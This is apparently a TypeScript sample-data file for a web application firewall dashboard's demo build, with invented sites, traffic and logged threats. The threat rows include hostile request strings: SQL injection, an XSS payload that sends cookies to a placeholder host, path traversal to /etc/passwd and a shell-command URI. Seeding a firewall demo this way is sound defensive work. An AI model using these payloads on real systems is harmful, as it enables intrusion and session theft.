// Sample data for the demo build (design review, screenshots, sales demos). Everything is relative to
// the moment the page loads, generated from a fixed seed, and every total is computed from the rows.
// Sites, sources and people here are invented; the demo build is never pointed at a real engine.

import type { Attack, Ban, Certificate, EventRow, GlobalRule, IPGroup, Resolved, SiteView, Token } from '../types'

let seed = 20261026
const rand = () => ((seed = (seed * 1103515245 + 12345) % 2147483648) / 2147483648)
const pick = <T,>(a: T[]) => a[Math.floor(rand() * a.length)]

export const NOW = new Date()
const HOUR = 3600_000
const MIN = 60_000
export const at = (msAgo: number) => new Date(NOW.getTime() - msAgo).toISOString()

// ---------- sites ----------

const base = (over: Partial<Resolved>): Resolved => ({
  name: '', description: '', project: '', type: 'proxy', domains: [], ports: [{ port: 80, https: false }, { port: 443, https: true }],
  upstreams: [], lb_policy: 'round_robin', redirect: { url: '', code: 302, preserve_path: false },
  advanced: { hsts: false, gzip: true, http_redirect: true, keep_host: true }, tls: { mode: 'auto', cert_id: '' },
  waf: { mode: 'block', paranoia: 1, anomaly_threshold: 5, protections: {
    sqli: true, xss: true, rce: true, lfi: true, rfi: true, php: true, nodejs: true, java: true, session_fixation: true,
    scanner: true, protocol: true, data_leak: false } },
  rate_limit: { access: null, attack: { requests: 10, window_sec: 60, ban_sec: 1800 }, error: { requests: 50, window_sec: 60, ban_sec: 600 } },
  access: { allow_ips: [], block_ips: [], allow_countries: [], block_countries: [], block_ips_file: '', allow_groups: [], block_groups: [], rules: [] },
  bot_challenge: { enabled: false, difficulty: 4 }, auth: { enabled: false, users: [], session_ttl_sec: 86400 },
  waiting_room: { enabled: false, max_active: 0, session_ttl_sec: 60 },
  block_page: { title: 'Request blocked', message: 'Your request was blocked by the web application firewall.' },
  exclusions: [],
  ...over,
})

const site = (id: string, daysOld: number, r: Resolved): SiteView => ({
  id, created: at(daysOld * 24 * HOUR), updated: at(daysOld * 6 * HOUR), doc: { name: r.name, domains: r.domains }, resolved: r,
})

export const S = {
  harbour: 's_4b1e0c7d92a3', tea: 's_9f2c11e6a084', wiki: 's_07d5be3c1f49', archive: 's_c3a8f0d2b716', teaRedirect: 's_e61b4a9c0d58',
}

export const sites: SiteView[] = [
  site(S.harbour, 64, base({
    name: 'Keelung Harbour Booking', description: 'Ferry and harbour-tour booking for Keelung Port.',
    domains: ['booking.keelungharbour.tw', 'www.keelungharbour.tw'], upstreams: ['10.20.1.22:8080', '10.20.1.23:8080'], lb_policy: 'ip_hash',
    rate_limit: { access: { requests: 120, window_sec: 10, ban_sec: 300 }, attack: { requests: 10, window_sec: 60, ban_sec: 1800 }, error: { requests: 50, window_sec: 60, ban_sec: 600 } },
    bot_challenge: { enabled: true, difficulty: 4 },
    waiting_room: { enabled: true, max_active: 400, session_ttl_sec: 90 },
    access: { allow_ips: [], block_ips: [], allow_countries: [], block_countries: [], block_ips_file: '', allow_groups: ['g_5a0e7c3d11b2'], block_groups: [], rules: [
      { name: 'Payment callback', action: 'allow', match: { path_prefix: '/payment/callback', ip: ['210.61.153.0/24'] } },
    ] },
    advanced: { hsts: true, gzip: true, http_redirect: true, keep_host: true },
    exclusions: [{ rule_id: 942100, path_exact: '/search', field: 'ARGS:q', note: 'Place names like "Null and Void Bay"' }],
  })),
  site(S.tea, 210, base({
    name: 'Lantern Tea Shop', description: 'Online shop for an Alishan oolong grower.',
    domains: ['lanterntea.com.tw', 'www.lanterntea.com.tw'], upstreams: ['10.20.1.15:8080'],
    access: { allow_ips: [], block_ips: [], allow_countries: [], block_countries: ['KP'], block_ips_file: '', allow_groups: [], block_groups: [], rules: [
      { name: 'Hide the shop admin', action: 'block', match: { path_prefix: '/wp-admin', not_ip: ['61.219.11.0/27'] } },
    ] },
  })),
  site(S.wiki, 3, base({
    name: 'Matsu Dev Wiki', description: 'Internal wiki for the Matsu island developers. New: in Watch while rules are tuned.',
    domains: ['wiki.matsu-dev.tw'], upstreams: ['10.20.2.8:3000'], project: '7c2e9f41a0b84d6e9f3a2c1b5d8e0f47',
    waf: { mode: 'detect', paranoia: 2, anomaly_threshold: 5, protections: {
      sqli: true, xss: true, rce: true, lfi: true, rfi: true, php: true, nodejs: true, java: true, session_fixation: true,
      scanner: true, protocol: true, data_leak: false } },
    auth: { enabled: true, users: [{ username: 'mei-ling' }, { username: 'chun-hao' }], session_ttl_sec: 604800 },
  })),
  site(S.archive, 401, base({
    name: 'Old Street Archive', description: "Static photo archive of Tamsui Old Street's shop fronts.",
    type: 'static', domains: ['archive.oldstreet.org.tw'], upstreams: null, tls: { mode: 'uploaded', cert_id: 'c_7e21a9d40b55' },
  })),
  site(S.teaRedirect, 210, base({
    name: 'lanterntea.tw', description: 'Short domain sent to the shop.', type: 'redirect', domains: ['lanterntea.tw'], upstreams: null,
    redirect: { url: 'https://lanterntea.com.tw', code: 301, preserve_path: true },
    waf: { mode: 'off', paranoia: 1, anomaly_threshold: 5, protections: {} }, rate_limit: { access: null, attack: null, error: null },
  })),
]

// ---------- threats: one row per WAF transaction ----------

interface SourcePlan {
  ip: string; country: string; site: string; host: string; startMin: number; minutes: number; count: number; blocked: boolean
  kinds: { cat: string; rule: string; msg: string; sev: number; uri: string; data: string; method?: string }[]
}

const plans: SourcePlan[] = [
  { ip: '45.148.10.82', country: 'NL', site: S.harbour, host: 'booking.keelungharbour.tw', startMin: 7, minutes: 3, count: 31, blocked: true, kinds: [
    { cat: 'scanner', rule: '913100', msg: 'Found User-Agent associated with security scanner', sev: 2, uri: '/', data: 'Matched Data: sqlmap found within REQUEST_HEADERS:User-Agent: sqlmap/1.8.4' },
    { cat: 'sqli', rule: '942100', msg: 'SQL Injection Attack Detected via libinjection', sev: 2, uri: "/tours?date=2026-11-02' AND SLEEP(5)-- -", data: "Matched Data: s&sos found within ARGS:date: 2026-11-02' AND SLEEP(5)-- -" },
    { cat: 'sqli', rule: '942190', msg: 'Detects MSSQL code execution and information gathering attempts', sev: 2, uri: '/tours?id=1 UNION SELECT table_name FROM information_schema.tables', data: 'Matched Data: UNION SELECT found within ARGS:id' },
  ] },
  { ip: '103.152.118.40', country: 'ID', site: S.tea, host: 'lanterntea.com.tw', startMin: 230, minutes: 40, count: 9, blocked: true, kinds: [
    { cat: 'xss', rule: '941100', msg: 'XSS Attack Detected via libinjection', sev: 2, uri: '/search?q=<script>document.location="//x.example/"+document.cookie</script>', data: 'Matched Data: XSS data found within ARGS:q: <script>document.location=...' },
    { cat: 'xss', rule: '941160', msg: 'NoScript XSS InjectionChecker: HTML Injection', sev: 2, uri: '/product/oolong-150g?review=<img src=x onerror=alert(1)>', data: 'Matched Data: <img src=x onerror found within ARGS:review' },
  ] },
  // the shop's own office saving a post: a false alarm the WordPress profile would prevent
  { ip: '61.219.11.20', country: 'TW', site: S.tea, host: 'lanterntea.com.tw', startMin: 52, minutes: 18, count: 4, blocked: true, kinds: [
    { cat: 'xss', rule: '941160', msg: 'NoScript XSS InjectionChecker: HTML Injection', sev: 2, method: 'POST', uri: '/wp-admin/post.php',
      data: 'Matched Data: <iframe  found within ARGS:content: <p>Spring harvest at the garden:</p><iframe src="https://www.youtube.com/embed/k3Q9dW...' },
    { cat: 'xss', rule: '941180', msg: 'Node-Validator Deny List Keywords', sev: 2, method: 'POST', uri: '/wp-json/wp/v2/posts/214',
      data: 'Matched Data: <!-- found within ARGS:json.content: <!-- wp:paragraph -->\\n<p>New season oolong is here' },
  ] },
  { ip: '185.220.101.4', country: 'DE', site: S.archive, host: 'archive.oldstreet.org.tw', startMin: 610, minutes: 6, count: 5, blocked: true, kinds: [
    { cat: 'rce', rule: '932160', msg: 'Remote Command Execution: Unix Shell Code Found', sev: 2, uri: '/photos/../../bin/sh?cmd=cat%20/etc/passwd', data: 'Matched Data: bin/sh found within REQUEST_FILENAME' },
    { cat: 'lfi', rule: '930120', msg: 'OS File Access Attempt', sev: 2, uri: '/photos?file=../../../../etc/passwd', data: 'Matched Data: etc/passwd found within ARGS:file' },
  ] },
  { ip: '61.219.11.18', country: 'TW', site: S.wiki, host: 'wiki.matsu-dev.tw', startMin: 170, minutes: 120, count: 6, blocked: false, kinds: [
    { cat: 'rce', rule: '932100', msg: 'Remote Command Execution: Unix Command Injection', sev: 2, uri: '/page/deploy-notes/edit', data: 'Matched Data: ;ssh deploy@10.20.2.8 found within ARGS:body' },
    { cat: 'sqli', rule: '942360', msg: 'Detects concatenated basic SQL injection and SQLLFI attempts', sev: 2, uri: '/page/db-migrations/edit', data: 'Matched Data: ALTER TABLE bookings found within ARGS:body' },
  ] },
]

export const attacks: Attack[] = []
export const matchesByTx: Record<string, EventRow[]> = {}
let eventId = 1
for (const p of plans) {
  for (let i = 0; i < p.count; i++) {
    const k = p.kinds[i % p.kinds.length]
    const msAgo = (p.startMin - (p.minutes * i) / Math.max(1, p.count - 1)) * MIN
    const tx = `${p.site}-${(0x1000000000 + Math.floor(rand() * 0xfffffffff)).toString(16)}`
    const ts = at(msAgo)
    attacks.push({
      tx_id: tx, ts, site_id: p.site, client_ip: p.ip, country: p.country, categories: [k.cat], matches: p.blocked ? 2 : 1,
      severity: k.sev, rule_id: k.rule, msg: k.msg, data: k.data, blocked: p.blocked, method: k.method ?? (k.uri.includes('/edit') ? 'POST' : 'GET'),
      host: p.host, uri: k.uri, status: p.blocked ? 403 : 200,
    })
    const ev = (rule: string, msg: string, cat: string, data: string, sev: number): EventRow => ({
      id: eventId++, ts, site_id: p.site, type: 'waf_match', client_ip: p.ip, country: p.country, host: p.host,
      method: '', uri: k.uri, rule_id: rule, detail: msg, tx_id: tx, data, severity: sev, category: cat,
    })
    matchesByTx[tx] = [ev(k.rule, k.msg, k.cat, k.data, k.sev)]
    if (p.blocked) matchesByTx[tx].push(ev('949110', 'Inbound Anomaly Score Exceeded (Total Score: 5)', 'score', '', 2))
  }
}
attacks.sort((a, b) => b.ts.localeCompare(a.ts))

// ---------- bans, and the events of the other stages ----------

export const bans: Record<string, Ban[]> = {
  [S.harbour]: [{ ip: '45.148.10.82', until: new Date(NOW.getTime() - 4 * MIN + 1800_000).toISOString() }],
}

export const events: EventRow[] = []
const event = (msAgo: number, siteId: string, type: string, ip: string, country: string, host: string, method: string, uri: string, detail = '') =>
  events.push({ id: eventId++, ts: at(msAgo), site_id: siteId, type, client_ip: ip, country, host, method, uri, rule_id: '', detail })

event(4 * MIN, S.harbour, 'rate_limit_ban', '45.148.10.82', 'NL', 'booking.keelungharbour.tw', 'GET', "/tours?id=1 UNION SELECT table_name FROM information_schema.tables", 'attack')
event(232 * MIN, S.tea, 'rule_block', '103.152.118.40', 'ID', 'lanterntea.com.tw', 'GET', '/wp-admin/install.php', 'Hide the shop admin')
for (let i = 0; i < 14; i++) {
  const path = pick(['/wp-admin/', '/wp-admin/setup-config.php', '/wp-login.php'])
  // the rule named is the one that really matches the path
  event((20 + i * 37) * MIN, S.tea, 'rule_block', pick(['193.32.162.9', '91.92.251.103', '147.45.47.88']), pick(['RU', 'BG', 'SC']), 'lanterntea.com.tw', 'GET', path,
    path === '/wp-login.php' ? 'Probes for WordPress logins' : 'Hide the shop admin')
}
for (let i = 0; i < 4; i++) event((140 + i * 61) * MIN, S.tea, 'geo_block', '175.45.176.' + (10 + i), 'KP', 'lanterntea.com.tw', 'GET', '/')
for (let i = 0; i < 26; i++) event((7 + i * 23) * MIN, S.harbour, i % 5 === 0 ? 'challenge_failed' : 'challenge_passed', i % 5 === 0 ? '20.171.207.' + (30 + i) : '1.169.' + (40 + i) + '.' + (11 + i), i % 5 === 0 ? 'US' : 'TW', 'booking.keelungharbour.tw', 'GET', i % 5 === 0 ? '/.hi-waf/verify' : '/tours', i % 5 === 0 ? 'token expired' : '')
for (let i = 0; i < 9; i++) event((33 + i * 71) * MIN, S.wiki, i === 3 || i === 4 ? 'auth_failed' : 'auth_passed', i === 3 || i === 4 ? '114.34.6.201' : '61.219.11.18', 'TW', 'wiki.matsu-dev.tw', 'POST', '/.hi-waf/auth', i === 3 || i === 4 ? 'admin' : pick(['mei-ling', 'chun-hao']))
for (let i = 0; i < 12; i++) event((15 + i * 55) * MIN, S.harbour, 'allowed_by_rule', '210.61.153.' + (20 + (i % 3)), 'TW', 'booking.keelungharbour.tw', 'POST', '/payment/callback/ecpay', 'Payment callback')
events.sort((a, b) => b.ts.localeCompare(a.ts))

// ---------- traffic: hourly buckets per site over 7 days ----------

export interface Bucket { t: number; site: string; passed: number; allow: number; deny: number; rate_limit: number; auth: number; wait: number; challenge: number; block: number; err4xx: number; err5xx: number; html: number; ips: number }
const dayCurve = (h: number) => 0.35 + 0.65 * Math.max(0, Math.sin(((h - 6) / 24) * Math.PI * 2 - 0.3) * 0.5 + 0.5)
const volume: Record<string, number> = { [S.harbour]: 620, [S.tea]: 240, [S.wiki]: 26, [S.archive]: 90, [S.teaRedirect]: 12 }
export const buckets: Bucket[] = []
const hourStart = Math.floor(NOW.getTime() / HOUR) * HOUR
for (let k = 7 * 24 - 1; k >= 0; k--) {
  const t = hourStart - k * HOUR
  const h = new Date(t).getHours()
  for (const s of sites) {
    const v = Math.round(volume[s.id] * dayCurve(h) * (0.85 + rand() * 0.3) * (k < 24 ? 1 : 0.92))
    buckets.push({ t, site: s.id, passed: v, allow: 0, deny: 0, rate_limit: 0, auth: 0, wait: 0, challenge: 0, block: 0,
      err4xx: Math.round(v * 0.018), err5xx: s.id === S.harbour && k === 30 ? 41 : Math.round(v * 0.001), html: Math.round(v * 0.38), ips: Math.max(1, Math.round(v * 0.09)) })
  }
}
const bucketFor = (iso: string, siteId: string) => {
  const t = Math.floor(new Date(iso).getTime() / HOUR) * HOUR
  return buckets.find((b) => b.t === t && b.site === siteId)
}
// every stopped or held request is one request in its hour, so the line and the logs agree
for (const a of attacks) { const b = bucketFor(a.ts, a.site_id); if (b && a.blocked) { b.block++; b.err4xx++ } }
for (const e of events) {
  const b = bucketFor(e.ts, e.site_id)
  if (!b) continue
  if (e.type === 'rule_block' || e.type === 'geo_block' || e.type === 'ip_block') { b.deny++; b.err4xx++ }
  if (e.type === 'challenge_passed' || e.type === 'challenge_failed') b.challenge++
  if (e.type === 'auth_failed') { b.auth++; b.err4xx++ }
  if (e.type === 'allowed_by_rule') b.allow++
}
// the banned scanner kept knocking: each attempt during the ban is a rate-limited request
const banStart = NOW.getTime() - 4 * MIN
for (let i = 0; i < 212; i++) {
  const b = bucketFor(new Date(banStart + (i / 212) * 3.5 * MIN).toISOString(), S.harbour)
  if (b) { b.rate_limit++; b.err4xx++ }
}
// gate pages shown to visitors before they signed in
for (const b of buckets) if (b.site === S.wiki && b.t > hourStart - 24 * HOUR) b.auth += 1

export const totalOf = (b: Bucket) => b.passed + b.allow + b.deny + b.rate_limit + b.auth + b.wait + b.challenge + b.block

// ---------- shared objects ----------

export const groups: IPGroup[] = [
  { id: 'g_5a0e7c3d11b2', name: 'HostingInside office', description: 'Taipei office egress and the VPN.', ips: ['61.219.11.0/27', '203.69.42.17'], updated: at(40 * 24 * HOUR) },
  { id: 'g_b19c4e2f7a60', name: 'Uptime probes', description: 'The monitoring service that checks every site each minute.', ips: ['52.69.186.44', '13.112.233.15', '18.179.98.200'], updated: at(12 * 24 * HOUR) },
]

export const rules: GlobalRule[] = [
  { id: 'r_2f8a6c0e1d93', name: 'Office and probes go straight through', enabled: true, action: 'allow', sites: [], ip_groups: ['g_5a0e7c3d11b2', 'g_b19c4e2f7a60'], not_ip_groups: [], match: { path_prefix: '/' }, priority: 0, updated: at(12 * 24 * HOUR) },
  { id: 'r_7c0d4a19be52', name: 'Probes for WordPress logins', enabled: true, action: 'block', sites: [S.tea, S.archive], match: { path_exact: '/wp-login.php' }, priority: 10, updated: at(30 * 24 * HOUR) },
  { id: 'r_a64e2b8f0c17', name: 'Refuse the scanner network', enabled: false, action: 'block', sites: [], match: { ip: ['45.148.10.0/24'] }, priority: 20, updated: at(40 * MIN) },
]

export const certificates: Certificate[] = [
  { id: 'c_7e21a9d40b55', name: 'archive.oldstreet.org.tw', subject: 'archive.oldstreet.org.tw', issuer: 'Sectigo RSA Domain Validation Secure Server CA', dns_names: ['archive.oldstreet.org.tw'], not_after: at(-12 * 24 * HOUR), used_by: [S.archive], created: at(353 * 24 * HOUR) },
]

export const tokens: Token[] = [
  { id: 't_3d9e0a7b21c4', name: 'billing-sync', created: at(20 * 24 * HOUR), last_used: at(26 * MIN) },
]

// ---------- the sums the screens rely on ----------
{
  const today = buckets.filter((b) => b.t > hourStart - 24 * HOUR)
  const blockedRequests = today.reduce((n, b) => n + b.block, 0)
  const blockedAttacks = attacks.filter((a) => a.blocked && new Date(a.ts).getTime() > hourStart - 24 * HOUR).length
  console.assert(blockedRequests === blockedAttacks, 'stopped by inspection = blocked threats', blockedRequests, blockedAttacks)
  console.assert(plans.reduce((n, p) => n + p.count, 0) === attacks.length, 'threat rows = planned sources')
}
